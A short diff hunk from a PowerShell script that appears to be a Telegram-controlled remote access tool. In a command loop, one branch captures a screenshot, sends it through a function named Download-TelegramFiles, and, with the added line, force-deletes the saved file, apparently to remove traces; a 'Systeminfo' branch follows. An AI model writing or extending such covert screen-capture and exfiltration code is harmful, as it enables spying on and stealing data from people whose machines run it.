@@ -192,6 +192,7 @@ while ($true) {
                     $bitmap.Save($screenshotFile, [System.Drawing.Imaging.ImageFormat]::Png)
 
                     Download-TelegramFiles -filePath "C:\temp\screenshot.png"
+                    Remove-Item -Path C:\temp\screenshot.png -Force
                 }
 
                 "Systeminfo" {
